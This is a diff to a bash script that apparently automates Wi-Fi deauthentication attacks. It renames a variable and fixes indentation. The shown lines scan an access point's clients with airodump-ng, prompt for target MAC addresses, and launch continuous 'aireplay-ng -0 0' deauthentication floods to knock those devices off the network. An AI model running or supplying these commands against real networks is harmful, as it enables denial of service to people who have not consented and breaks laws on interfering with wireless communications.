@@ -622,18 +622,18 @@ do
                                         echo -e -n "$orange""Type Access-Point's Channel :  $nc"
                                         read ap_chan
                                         echo "Searching For Clients For Selected Access Point..."
-                                        sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng --bssid $ap_mac --channel $ap_chan $interface 2>&1 | tee ap_scan.txt" &&
+                                        sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng --bssid $BSSID --channel $ap_chan $interface 2>&1 | tee ap_scan.txt" &&
                                         echo -e "$blue""CTRL+C TO STOP Searching!$nc"
                                         cat ap_scan.txt
                                         echo -e -n "$yellow""How many target(s)? $nc"
                                         read targets
-                                        xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $ap_mac --channel $ap_chan $interface " & sleep 2
+                                        xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $BSSID --channel $ap_chan $interface " & sleep 2
                                         for (( i = 1; i < targets+1; i++ )); do
                                             echo -e -n "$orange""Type Target's MAC-Address n° $i :  $nc"
                                             read dv_mac
                                             echo -e "$cyan""Kicking$nc""$red"" $dv_mac $nc"
                                             sleep 0.5
-                                            xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $ap_mac -c $dv_mac $interface " & sleep 2
+                                            xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $BSSID -c $dv_mac $interface " & sleep 2
                                         done                                    
                                         echo -e "$blue""PRESS RETURN TO STOP KICKING$nc"
                                         read input
@@ -675,7 +675,7 @@ do
                         echo -e -n "$orange""Type Access-Point's Channel :  $nc"
                         read ap_chan
                         echo "Searching For Clients For Selected Access Point..."
-                        sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng --bssid $ap_mac --channel $ap_chan $interface 2>&1 | tee ap_scan.txt" &&
+                        sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng --bssid $BSSID --channel $ap_chan $interface 2>&1 | tee ap_scan.txt" &&
                         echo -e "$blue""CTRL+C TO STOP Searching!$nc"
                         cat ap_scan.txt
                         echo -e -n "$yellow""How many target(s)? $nc"
@@ -693,8 +693,8 @@ do
                         pkill airodump-ng
                         pkill aireplay-ng
                         echo 'Cleaning files...'
-                                        rm ap_scan.txt aps_scan.txt  >/dev/null 2>&1
-                                        sleep 0.5
+                        rm ap_scan.txt aps_scan.txt  >/dev/null 2>&1
+                        sleep 0.5
                         echo "Restoring interface to managed mode... "
                         sleep 1
                         sudo ifconfig "$interface" down >/dev/null 2>&1
@@ -728,7 +728,7 @@ do
                                         echo -e -n "$orange""Type Access-Point's Channel :  $nc"
                                         read ap_chan
                                         echo "Searching For Clients For Selected Access Point..."
-                                        sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng --bssid $ap_mac --channel $ap_chan $interface 2>&1 | tee ap_scan.txt" &&
+                                        sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP SEARCHING !' && airodump-ng --bssid $BSSID --channel $ap_chan $interface 2>&1 | tee ap_scan.txt" &&
                                         echo -e "$blue""CTRL+C TO STOP Searching!$nc"
                                         cat ap_scan.txt
                                         echo -e -n "$yellow""How many target(s)? $nc"
